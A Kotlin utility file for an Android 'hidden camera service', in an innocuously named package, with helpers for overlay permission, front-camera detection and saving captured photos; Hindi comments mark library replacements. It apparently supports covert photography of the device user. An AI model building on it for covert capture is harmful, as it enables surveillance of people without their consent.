package com.safe.setting.app.utils.hiddenCameraServiceUtils

import android.content.Context
import android.content.Context.CAMERA_SERVICE
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Matrix
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.provider.Settings
import android.util.Log
import androidx.annotation.WorkerThread
import androidx.core.net.toUri
import com.safe.setting.app.utils.ConstFun
import com.safe.setting.app.utils.Consts.ADDRESS_PHOTO
import com.safe.setting.app.utils.Consts.TAG
import com.safe.setting.app.utils.FileHelper.getFilePath
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraImageFormat
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraRotation
// import com.pawegio.kandroid.e // **** पुराना इम्पोर्ट हटा दिया गया ****
// import com.pawegio.kandroid.start // **** पुराना इम्पोर्ट हटा दिया गया ****
import java.io.File
import java.io.FileOutputStream
import java.io.IOException


object HiddenCameraUtils {

    fun Context.canOverDrawOtherApps(): Boolean {
        return Settings.canDrawOverlays(this)
    }

    fun Context.openDrawOverPermissionSetting() {
        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, "package:$packageName".toUri())
        // **** बदला हुआ कोड: intent.start(this) को context.startActivity(intent) से बदलें ****
        this.startActivity(intent)
        // **** बदलाव समाप्त ****
    }

    fun Context.isFrontCameraAvailable(): Boolean {
        val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        try {
            val cameraIds = cameraManager.cameraIdList
            for (cameraId in cameraIds) {
                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    return true
                }
            }
        } catch (e: CameraAccessException) {
            Log.e("CameraAccess", "Error checking camera availability: $e")
        }
        return false
    }

    @Throws(Exception::class)
    fun Context.getFileName() : String {
        val file: File?
        try {
            file = File(getFilePath(), ADDRESS_PHOTO)

            if (!file.exists()) {
                file.mkdirs()
            }
        } catch (e: Exception) {
            throw Exception(e)
        }

        return "${file.absolutePath}/IMG_${ConstFun.getRandomNumeric()}.jpeg"
    }

    @WorkerThread
    internal fun Bitmap.rotateBitmap(@CameraRotation.SupportedRotation rotation: Int): Bitmap {
        val matrix = Matrix()
        matrix.postRotate(rotation.toFloat())
        return Bitmap.createBitmap(this, 0, 0, width, height, matrix, true)
    }

    internal fun Bitmap.saveImageFromFile(fileToSave: File,
                                          @CameraImageFormat.SupportedImageFormat imageFormat: Int): Boolean {
        var out: FileOutputStream? = null
        var isSuccess:Boolean

        val compressFormat = if (imageFormat == CameraImageFormat.FORMAT_JPEG) Bitmap.CompressFormat.JPEG
        else Bitmap.CompressFormat.PNG

        try {
            if (!fileToSave.exists()) fileToSave.createNewFile()
            out = FileOutputStream(fileToSave)
            compress(compressFormat, 100, out)
            isSuccess = true
        } catch (e: Exception) {
            // **** बदला हुआ कोड: kandroid.e को Log.e से बदलें ****
            Log.e(TAG,e.message.toString())
            // **** बदलाव समाप्त ****
            isSuccess = false
        } finally {
            try {
                out?.close()
            } catch (e: IOException) {
                // **** बदला हुआ कोड: kandroid.e को Log.e से बदलें ****
                Log.e(TAG,e.message.toString())
                // **** बदलाव समाप्त ****
            }
        }
        return isSuccess
    }
}
